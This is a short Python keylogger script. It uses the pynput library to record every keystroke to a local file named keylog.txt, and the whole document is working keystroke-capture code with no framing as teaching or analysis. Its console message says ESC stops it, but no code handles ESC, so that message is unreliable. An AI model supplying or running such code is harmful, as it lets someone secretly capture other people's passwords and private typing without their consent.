from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(f" [{key.name}] ")
    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... (Press ESC to stop)")
    listener.join()
